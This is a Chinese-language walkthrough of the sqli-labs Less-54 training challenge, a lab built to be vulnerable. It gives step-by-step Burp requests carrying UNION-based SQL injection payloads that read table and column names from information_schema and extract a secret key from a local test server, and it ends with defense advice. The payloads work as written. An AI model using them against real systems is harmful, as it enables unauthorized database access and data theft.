## 题目: Sqli‑labs Less‑54

## 题目描述
GET参数id，单引号字符型UNION注入，Challenge挑战关卡。目标库为`challenges`，**表名、secret列名、key值每次Reset全部随机生成；id每请求一次计数+1，最多10次机会，超过自动重置全部数据**。页面回显第2、3列，需要用尽量少请求拿到secret key提交通关。

## 核心原理
```php
$sql = "SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
```
* 关键点：id 参数单引号闭合；页面回显 UNION 查询第 2、3 列；计数机制，每访问 id 参数请求计数 + 1，禁止 order by 暴力试列数；目标数据不在 security 库，在 challenges 库；Reset 按钮会重新生成随机表与 secret key，同时清空计数。

**解题思路**
1. 点击页面 Reset，初始化一套随机环境；
2. Burp 抓包修改 id 参数，利用 UNION 一次查询 information_schema，获取 challenges 库随机表名；
3. UNION 查询获取 secret 开头的随机列名；
4. UNION 查询读出 secret key；
5. 页面提交 key 完成通关，全程控制请求次数。

## 解题步骤
### 1. 初始化环境
页面点击`Reset the Challenge!`，重置计数与随机表数据，不要重复点击。

### 2. 获取随机表名 Burp 包
```
GET /sqli-labs/Less-54/?id=-1' union select 1,(select table_name from information_schema.tables where table_schema='challenges'),(select column_name from information_schema.columns where table_schema='challenges' limit 0,1) -- - HTTP/1.1
Host: 127.0.0.1
```
页面`Your Login name`处返回随机表名。

### 3. 获取 secret 列名 Burp 包
```
GET /sqli-labs/Less-54/?id=-1' union select 1,(select column_name from information_schema.columns where table_schema='challenges' limit 2,1),3 -- - HTTP/1.1
Host: 127.0.0.1
```
页面`Your Login name`处返回`secret_xxxx`随机列名。

### 4. 获取 secret key Burp 包
> 
> 将下面 payload 中`ycx41szva2`替换成实际表名，`secret_9UTM`替换实际 secret 列名
```
GET /sqli-labs/Less-54/?id=-1' union select 1,(select secret_9UTM from ycx41szva2),3 -- - HTTP/1.1
Host: 127.0.0.1
```
页面回显拿到 secret key 字符串。

### 5. 提交 key Burp 包
```
POST /sqli-labs/Less-54/index.php HTTP/1.1
Host: 127.0.0.1
Content‑Type: application/x‑www‑form‑urlencoded

key=w75OHF3RaP7270AljHlmH3WM&answer_key=Submit
```
返回通关图片即完成挑战。

## 踩坑记录
1. Reset 只能点一次，重复点击会全部刷新随机数据，前面收集信息全部作废。
2. 目标库是`challenges`，不要写成 security 库查询。
3. 严格控制请求次数，不要用 order by 逐次试列数，会消耗次数导致重置。
4. 列顺序固定 secret 列一般在 limit 2,1 位置，环境异常可以使用`column_name like 'secret%'`匹配。
5. 需要保持会话 Cookie，丢失 Cookie 会触发重置，数据失效。
6. 提交成功之后会自动重置数据库，属于正常现象。

## 知识点总结
- Challenge 挑战关特性：随机表 / 列、请求次数限制，考察高效信息收集，不依赖复杂注入手法。
- information_schema 库查询：tables 查表名、columns 查字段名。
- UNION 多子查询，单次请求同时带出多条信息，节约请求次数。
- 限次注入场景：尽量减少请求，避免暴力探测消耗机会。
- 防御：预编译参数绑定；接口请求频率 / 次数限制；随机表名仅提升攻击门槛，不能作为安全防御手段。
